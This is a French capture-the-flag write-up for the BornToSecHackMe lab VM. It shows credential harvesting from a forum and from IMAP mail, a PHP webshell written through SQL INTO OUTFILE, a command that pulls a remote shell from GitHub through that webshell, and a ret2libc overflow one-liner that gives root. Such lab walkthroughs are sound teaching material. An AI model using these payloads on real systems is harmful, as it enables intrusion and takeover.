# Writeup 4 : Méthodes Alternatives & Exploitation Manuelle

## Introduction

Ce writeup présente une approche alternative pour compromettre la machine **BornToSecHackMe**. Nous privilégierons ici l'utilisation d'outils en ligne de commande et l'exploitation manuelle des services (IMAP, SQL) pour démontrer une compréhension approfondie des protocoles, par opposition à l'utilisation des interfaces web.

## 1. Reconnaissance & Collecte d'Informations

### Scan Initial
Un scan de ports révèle les services standards : HTTP/HTTPS, FTP, SSH, et IMAP/IMAPS.

### Énumération Web (Forum)
Le serveur héberge un forum "My Little Forum". L'analyse des en-têtes HTTP confirme la version :
```bash
curl -sk https://$TARGET/forum/ | grep "generator"
# <meta name="generator" content="my little forum 2.3.4" />
```

En naviguant sur le forum, un sujet "Problème login" attire notre attention. L'utilisateur `lmezard` y a accidentellement copié une ligne de log SSH révélant son mot de passe saisi par erreur dans le champ username :
`Failed password for invalid user !q\]Ej?*5K5cy*AJ`

**Credentials récupérés :**
*   User : `lmezard`
*   Pass : `!q\]Ej?*5K5cy*AJ`

Ces identifiants nous donnent accès au profil `lmezard` sur le forum, révélant son email : `laurie@borntosec.net`.

## 2. Interaction Manuelle avec IMAP (OpenSSL)

Au lieu d'utiliser le Webmail (SquirrelMail), nous interagissons directement avec le service IMAPS (port 993) via OpenSSL pour lire les emails.

### Connexion
```bash
openssl s_client -connect $TARGET:993
```

### Exploration de la Boîte Mail
Une fois connecté, nous utilisons les commandes du protocole IMAP :

1.  **Authentification :**
    ```
    a LOGIN laurie@borntosec.net !q\]Ej?*5K5cy*AJ
    ```
2.  **Lister les dossiers :**
    ```
    a LIST "" "*"
    # Découverte de "INBOX.Sent" (Éléments envoyés)
    ```
3.  **Sélectionner le dossier :**
    ```
    a SELECT "INBOX.Sent"
    ```
4.  **Lire les emails :**
    Nous récupérons le contenu du mail n°2 qui semble contenir des accès BDD.
    ```
    a FETCH 2 BODY[]
    ```

**Contenu du mail :**
> "You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$"

**Credentials BDD :**
*   User : `root`
*   Pass : `Fg-'kKXBj87E:aJ$`

## 3. Webshell via Injection SQL (Into Outfile)

Avec les accès root à la base de données (via phpMyAdmin), nous pouvons exécuter des requêtes SQL arbitraires. Notre objectif est d'écrire un fichier PHP (Webshell) sur le serveur.

### Identification d'un Répertoire Inscriptible
MySQL tourne souvent avec des droits restreints. L'écriture à la racine `/var/www/` échoue généralement (Erreur 13).
La documentation du forum indique que le dossier `templates_c` doit être inscriptible (chmod 777) pour le fonctionnement du cache.

### Injection du Payload
Nous injectons un "Stager" PHP simple dans ce répertoire :

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"
```

### Escalade vers un Shell Interactif
Une fois le stager en place, nous l'utilisons pour télécharger un shell plus robuste, comme **p0wny-shell**, pour une meilleure ergonomie :

```bash
curl -k "https://$TARGET/forum/templates_c/shell.php?cmd=curl -o p0wny.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
```

En accédant à `https://$TARGET/forum/templates_c/p0wny.php`, nous obtenons un shell interactif `www-data`.
L'exploration des fichiers de configuration nous donne un nouveau mot de passe pour `lmezard` : `G!@M6f4Eatau{sF"`.

## 4. Reconstitution de Code (FTP & Scripting)

L'accès FTP avec `lmezard` nous donne une archive `fun` contenant des centaines de fichiers `.pcap` qui sont en réalité des fragments de code C.

Chaque fichier contient un indice en commentaire (e.g., `//file12`). Pour retrouver le mot de passe, il faut :
1.  Extraire et lire tous les fichiers.
2.  Les concaténer dans l'ordre indiqué par les commentaires.
3.  Compiler le résultat.

Le programme reconstitué affiche : `MY PASSWORD IS: Iheartpwnage`.
Le SHA-256 de ce mot de passe donne l'accès à l'utilisateur suivant.

**Credentials SSH :**
*   User : `laurie`
*   Pass : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## 5. Reverse Engineering (La Bombe)

Dans le home de `laurie`, le binaire `bomb` exige de passer 6 phases.
Solutions des phases :
1.  `Public speaking is very easy.`
2.  `1 2 6 24 120 720` (Suite factorielle)
3.  `1 b 214`
4.  `9` (Fibonacci)
5.  `opekmq` (Mapping caractères)
6.  `4 2 6 3 1 5` (Linked List sorting)

Le mot de passe de **thor** est la concaténation de ces réponses : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

## 6. Algorithmique (La Tortue)

L'utilisateur `thor` possède un fichier `turtle` contenant des instructions graphiques (Turtle Graphics).
L'exécution (ou la simulation) trace les lettres du mot **SLASH**.
La consigne "Can you digest the message?" suggère un hashage. Le MD5 de "SLASH" est le mot de passe de **zaz**.

**Credentials SSH :**
*   User : `zaz`
*   Pass : `646da671ca01bb5d84dbb5fb2238dc8e`

## 7. Exploitation Binaire (Root)

Le binaire `exploit_me` appartient à root et possède le bit **SUID**.
Il est vulnérable à un **Buffer Overflow** classique via `strcpy` (pas de vérification de taille).

### Stratégie d'Exploitation (Ret2Libc)
L'ASLR étant désactivé, nous pouvons rediriger le flux d'exécution vers la fonction `system()` de la libc pour exécuter `/bin/sh`.

**Payload Structure :**
`[PADDING (140 bytes)] + [ADDR system()] + [ADDR exit()] + [ADDR "/bin/sh"]`

Commande d'exploitation :
```bash
./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x58\xcc\xf8\xb7"')
```

Nous obtenons ainsi un shell **root**.
